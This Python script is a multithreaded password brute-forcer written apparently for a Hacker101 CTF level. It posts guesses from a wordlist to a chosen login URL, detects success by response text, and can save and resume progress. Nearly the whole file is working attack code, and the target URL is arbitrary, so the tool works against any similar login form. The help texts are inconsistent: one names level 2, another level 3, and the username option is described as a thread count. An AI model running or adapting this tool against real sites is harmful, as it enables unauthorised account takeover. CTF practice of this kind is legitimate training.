#!/usr/bin/env python3
# h101_login.py
import os
import pathlib
import sys
import time
from concurrent.futures import ThreadPoolExecutor, Future
from queue import Queue

import click
import requests
from rich.console import Console
from rich.progress import Progress
from rich.prompt import Prompt


class H101Login:
    """
    This class is for brute forcing passwords at hacker101 CTF level 2.
    """

    def __init__(self, url: str, username: str, wordlist_file: pathlib.Path, max_threads: int, valid_string: str,
                 invalid_string: str) -> None:
        self.c = Console()
        self.p = Prompt()
        self.url: str = url
        self.username = username
        self.wordlist_file: pathlib.Path = wordlist_file
        self.wordlist = []
        self.backup_wordlist = []
        self.max_threads = max_threads
        self.valid_string = valid_string
        self.invalid_string = invalid_string.strip()
        self.session = requests.Session()
        self.data = {"username": "", "password": ""}
        self.word_queue = Queue()
        self.found_passwd = []
        self.futures = Queue()
        self.serialized_list = []

    def backup_queue(self, word):
        self.serialized_list.append(word + "\n")

    def _loop_words(self, seq_number, word):
        word = word.strip()
        if word != "":
            data = {"username": self.username, "password": word}
            self.backup_queue(data["password"])
            response = self.send_request(data)
            self.check_response(seq_number, word, response)

    def create_queue(self, wordlist):
        progress = Progress()
        task = progress.add_task("Progress:", total=len(wordlist))
        self.c.print(f"[+] Generating words queue. Total passwords: {len(wordlist)}...")
        progress.start()
        for word in set(wordlist):
            self.word_queue.put(word.strip())
            progress.update(task, advance=1)
        progress.stop()
        self.c.print(f"Queue complete: {len(self.word_queue.queue)} passwords.")

    def loop_words(self, wordlist):
        self.create_queue(wordlist)
        print("[+] Queue successfully generated...")
        print(f"[*] Attempting login with username: {self.username}")
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            seq_number = 1
            while not self.word_queue.empty():
                word = self.word_queue.get()
                future = executor.submit(self._loop_words, seq_number, word)
                self.futures.put(future)
                seq_number += 1

    def send_request(self, data) -> requests.Session.post:
        response = self.session.post(url=self.url, data=data)
        return response

    def check_response(self, seq_number, word, response):
        # try:
        content = response.content.decode()
        if self.invalid_string not in content:
            if self.valid_string in content:
                print(f"\n[+] Found password: {word}")
                self.found_passwd.append(word)
                print(f"\tTotal found passwords ({len(self.found_passwd)}): {self.found_passwd}")
            else:
                print(f"\n[-] Unknown response: \n{content}", end="")
        else:
            print(f"\r[*] Attempted requests: {seq_number}. Current password: {word}", end=" " * 10)
            sys.stdout.flush()
            time.sleep(0.1)
        # except KeyboardInterrupt:
        #     self.close()

    def start_words_loop(self, resume=False):
        print("[+] Reading wordlist...")
        if resume:
            resume_confirm = self.p.ask("Want to resume previous session?", choices=["y", "n"], show_choices=True,
                                        default="y")
            if resume_confirm == "y":
                self.wordlist_file = ".h101_backup.json"
                with open(self.wordlist_file, "r") as bkp_file:
                    self.wordlist = bkp_file.readlines()
                self.c.log(f"Total passwords for attack (using backup file): {len(self.wordlist)}")
            else:
                with open(self.wordlist_file, "r") as wl:
                    self.wordlist = wl.readlines()
                    self.c.log(f"Total passwords for attack (not using backup file): {len(self.wordlist)}")
        else:
            with open(self.wordlist_file, "r") as wl:
                self.wordlist = wl.readlines()
                self.c.log(f"Total passwords for attack: {len(self.wordlist)}")
        self.loop_words(self.wordlist)

    def confirm_backup_creation(self):
        return self.p.ask("Do you want to create a resume file for next time?", choices=["y", "n"],
                          default="y", show_choices=True)

    def create_backup_wordlist(self):
        bkp_list = set(self.wordlist) - set(self.serialized_list)
        self.backup_wordlist = [word.strip() for word in bkp_list]
        backup_wordlist = set(self.backup_wordlist)
        total_words_to_write = len(backup_wordlist)
        return backup_wordlist, total_words_to_write

    def _write_to_backup_file(self, backup_wordlist, progress, task):
        with open(".h101_backup_res.json", "w") as bkp_file:
            for word in backup_wordlist:
                bkp_file.write(word + "\n")
                progress.update(task, advance=1)


    def create_backup_file(self):
        print()
        self.c.print("\n[*] Aborting. Please wait...\n", style="red")
        time.sleep(3)
        with self.c.screen(style="green4"):
            confirm = self.confirm_backup_creation()
        if confirm:
            progress = Progress()
            backup_wordlist, total_words_to_write = self.create_backup_wordlist()
            self.c.print(f"\nTotal words to write: {total_words_to_write}", style="green4")
            task = progress.add_task("Creating backup file:", total=total_words_to_write)
            progress.start()
            self._write_to_backup_file(backup_wordlist, progress,task)
            progress.stop()
            os.rename(".h101_backup_res.json", ".h101_backup.json")
            self.c.print("Backup file created successfully.")
        else:
            self.c.print("Backup file not created. Bye.")
            return

    def close(self):
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            while not self.futures.empty():
                future = self.futures.get()
                if isinstance(future, Future):
                    if not future.cancelled():
                        future.cancel()
                executor.shutdown(wait=True)
            else:
                self.create_backup_file()
        sys.exit("[-] Detected KeyboardInterrupt. Quitting...")

    def run(self):
        try:
            if os.path.exists(".h101_backup.json"):
                self.start_words_loop(resume=True)
            else:
                self.start_words_loop()
            try:
                os.remove(".h101_backup.json")
            except FileNotFoundError:
                pass
        except KeyboardInterrupt:
            self.close()


@click.command(
    help="""
        This app brute forces passwords at hacker101 CTF level 3.
        """
)
@click.option(
    "-u", "--url", "url",
    required=True,
    help="Type the target URL.",
    type=str,
)
@click.option(
    "-l", "--username", "username",
    help="Type the number of concurrent threads.",
    prompt="Type the username for brute-forcing.",
    default="admin",
    required=True,
    type=str,
)
@click.option(
    "-w", "--wordlist", "wordlist",
    required=True,
    help="Type the path to wordlist file.",
    type=pathlib.Path,
)
@click.option(
    "-m", "--max_threads", "max_threads",
    help="Type the number of concurrent threads.",
    default=10,
    required=True,
    type=int,
)
@click.option(
    "-v", "--valid_string", "valid_string",
    help="Type successful login string.",
    prompt="Successful login string",
    default="Logged In",
    required=True,
    type=str
)
@click.option(
    "-i", "--invalid_string", "invalid_string",
    help="Type unsuccessful login string.",
    prompt="Unsuccessful login string",
    default="Invalid password",
    required=True,
    type=str
)
def main(url, username, wordlist, max_threads, valid_string, invalid_string):
    login_bypass_robot = H101Login(url, username, wordlist, max_threads, valid_string, invalid_string)
    login_bypass_robot.run()


if __name__ == "__main__":
    main()
